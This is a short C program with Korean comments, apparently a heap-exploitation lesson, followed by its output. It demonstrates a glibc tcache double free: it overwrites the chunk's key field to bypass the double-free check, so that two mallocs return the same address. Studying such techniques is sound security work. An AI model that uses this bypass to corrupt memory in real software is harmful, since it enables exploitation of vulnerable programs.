``` c
// Name: tcache_dup.c
// Compile: gcc -o tcache_dup tcache_dup.c

#include <stdio.h>
#include <stdlib.h>

int main() {

/*
0x20 바이트(32바이트) 크기의 메모리를 할당
반환된 포인터(chunk)는 heap 상의 특정 주소를 가리킴.
tcache bin에 들어갈 수 있는 사이즈임(작은 bin)
*/
  void *chunk = malloc(0x20);
  printf("Chunk to be double-freed: %p\n", chunk);

  /*
  malloc으로 할당한 chunk를 해제.
  glibc 2.27이후 tcache가 적용되어 있다면, 이 chunk는 tcache linked list에 들어감.
  tcache 구조:
  chunk -> next free chunk -> next free chunk...
  chunk 내부에는 next 포인터와 key 값이 있음.(glibc tcache 내부 관리용)
  */
  free(chunk);

  /*
  chunk + 8 : heap chunk 구조에서 key가 있는 위치
  tcache double free 방지용 key 값을 조작하는것.
  glibc 2.27 이상에서는 double free를 막기 위해 tcache->key를 사용한다.
  이 코드는 key 를 변조하여 tcache가 double free를 막지 못하도록 우회.
  즉, 실제 해킹에서는 chunk->key를 바꾸면 tcache double free 방어를 우회할 수 있음.

  두 번째 free(Double Free)
  같은 chunk를 두 번째로 free
  정상적으로라면 glibc tcache에서 double free 방지용 체크를 함.
  이전 단계에서 key를 조작했기 때문에, tcache double free 검사를 우회
  결과적으로 tcache에 같은 chunk가 두번 들어가게 됨.
  */
  *(char *)(chunk + 8) = 0xff;  // manipulate chunk->key
  free(chunk);                  // free chunk in twice

  /*
  tcache에 같은 chunk가 두 개 들어가 있으므로, malloc을 두 번 하면 같은 주소를 다시 반환.
  즉, 두 개의 malloc이 동일한 메모리를 가리키게 됨(use-after-free / heap corruption의 시작점.)
  */
  printf("First allocation: %p\n", malloc(0x20));
  printf("Second allocation: %p\n", malloc(0x20));

  return 0;
}
```

```
$ ./tcache_dup
Chunk to be double-freed: 0x55d4db927260
First allocation: 0x55d4db927260
Second allocation: 0x55d4db927260
```

chunk 가 tcache 에 중복 연결되어 연속으로 재할당되는 것을 확인할 수 있다.